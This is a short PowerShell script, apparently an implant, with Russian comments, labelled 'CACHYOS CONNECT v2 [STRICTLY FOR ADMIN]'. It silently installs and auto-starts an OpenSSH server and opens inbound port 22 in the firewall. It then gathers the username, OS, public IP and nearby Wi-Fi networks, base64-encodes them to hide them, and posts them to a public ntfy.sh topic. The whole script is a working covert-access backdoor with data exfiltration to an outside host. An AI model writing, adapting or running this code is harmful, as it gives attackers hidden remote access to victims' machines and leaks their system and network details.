# --- CACHYOS CONNECT v2 [STRICTLY FOR ADMIN] ---
$topic = "cachyos_connect"

# 1. Тихая установка SSH-сервера
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue
Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'
New-NetFirewallRule -Name 'AllowSSH' -DisplayName 'Allow SSH' -Enabled True -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue

# 2. Сбор данных о системе и сетях вокруг (Функция 6)
$wifi = netsh wlan show networks | Out-String
$sysInfo = "User: $env:USERNAME | OS: $((Get-WmiObject Win32_OperatingSystem).Caption) | IP: $(Invoke-RestMethod ipinfo.io/ip)"

# 3. Шифрование в Base64 (чтобы данные не светились в открытую)
$bytes = [System.Text.Encoding]::UTF8.GetBytes("$sysInfo `n--- NETWORKS ---`n$wifi")
$encoded = [Convert]::ToBase64String($bytes)

# 4. Отправка сигнала в ntfy
Invoke-RestMethod -Method Post -Uri "https://ntfy.sh/$topic" -Body $encoded
